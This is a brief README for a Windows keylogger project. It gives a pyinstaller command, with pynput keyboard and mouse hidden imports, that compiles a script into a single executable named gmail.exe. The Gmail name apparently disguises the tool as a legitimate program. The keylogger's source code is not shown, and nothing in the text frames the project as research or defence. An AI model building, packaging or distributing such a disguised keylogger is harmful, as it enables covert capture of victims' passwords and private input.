# keylogger

# Compiled in WINDOWS
  Download and extract the files from the `keylogger.zip`, and run the following command:
  
    pyinstaller --onefile --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 .\gmail.pyw
  
  ![](https://i.imgur.com/6kw0uBV.png)
  
  `gmail.exe` is created in the path `\keylogger\disk\gmail.exe` the `gmail.exe` contains all the necessary libraries to function.
  
